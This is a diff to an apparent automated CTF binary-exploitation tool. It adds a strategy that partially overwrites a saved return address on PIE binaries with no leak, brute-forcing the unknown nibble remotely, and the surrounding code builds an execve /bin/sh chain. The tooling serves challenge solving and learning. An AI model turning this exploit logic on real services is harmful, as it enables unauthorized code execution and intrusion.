@@ -1,6 +1,8 @@
 """策略集合：每个函数产出若干 Plan（有序尝试），由 orchestrator 执行并验证。"""
 from __future__ import annotations
 
+import os
+
 import re
 from dataclasses import dataclass, field
 from typing import Iterable, Optional
@@ -245,6 +247,57 @@ def s_syscall_execve(ch: Challenge, f: Facts) -> Iterable[Plan]:
                 bytes(hop), bytes(final), b"/bin/sh\x00\x00\x00\x00"],
                f"int80 execve 3-stage: data={hex(f.data_addr)} off={off} "
                f"plant={plant} entry_sub={hex(f.entry_sub)}")
+
+
+# --------------------------------------------------------------------------- 0c. PIE + 无泄漏 -> 部分覆盖返回地址
+def _gate_offsets(f: Facts, v) -> list:
+    """把 `cmp dword ptr [rbp-X], imm` 换算成「缓冲区里的偏移」。"""
+    out = []
+    for disp, val in getattr(f, "gates", []) or []:
+        off = disp - v.buf_disp
+        if 0 <= off and off + 4 <= (v.offset or 0):
+            out.append((off, val))
+    return out
+
+
+def s_pie_partial_win(ch: Challenge, f: Facts) -> Iterable[Plan]:
+    """PIE + 没有任何泄漏 + 存在 win 函数：只覆盖「栈上已有的那个返回地址」的低 2 字节。
+
+    为什么必须这么做：win 与返回地址在同一个 64K 内（否则覆盖不到），但基址每次随机，
+    低 16 位里的那个 0x1000 位未知 —— 只能枚举 16 种（本地进程可直接读 /proc/pid/maps 算准）。
+
+    另外两件事：
+      * 体里若有 `cmp dword ptr [rbp-X], imm` 校验，必须把 imm 一起写回去，否则走不到 leave;ret
+      * ret 进入函数比 call 进入的 rsp 高 8，`system` 里 movaps 会崩 -> 用跳过 push rbp 的入口
+    """
+    if not ch.elf.pie:
+        return
+    w = f.shell_win or next((x for x in f.wins if x.kind == "flag"), None)
+    if w is None:
+        return
+    v = next((x for x in f.vulns if x.offset), None)
+    if not v or not v.func_entry:
+        return
+    rets = f.callers.get(v.func_entry) or []
+    if not rets:
+        return
+    ret_addr = rets[0]
+    if (ret_addr >> 16) != (w.addr >> 16):
+        return                     # 不同 64K，低 2 字节覆盖够不着
+
+    targets = []
+    if getattr(w, "alt", 0) and (w.alt >> 8) == (w.addr >> 8):
+        targets.append(w.alt)      # 先试对齐版本
+    targets.append(w.addr)
+
+    # 远程只能猜基址的 0x1000 位；本地进程可直接读 /proc/pid/maps，不用猜
+    blind = bool(getattr(ch, "host", None)) or bool(os.environ.get("AUTOPWN_NO_MAPS"))
+    nibs = range(16) if blind else [-1]
+    for tgt in targets:
+        for nib in nibs:
+            yield Plan("pie_partial", [], tag=f"pie:{tgt}:{nib}:{w.kind}",
+                       desc=f"partial ret -> {hex(tgt)} off={v.offset} "
+                            f"(ret={hex(ret_addr)}, nib={nib}, kind={w.kind})")
 
 
 # --------------------------------------------------------------------------- 1a. ret2win(PIE 局部覆盖)
@@ -725,6 +778,7 @@ def _writable(ch: Challenge) -> Optional[int]:
 
 
 STRATEGIES = [
+    s_pie_partial_win,
     s_syscall_direct,
     s_syscall_execve,
     s_ret2win_pie,
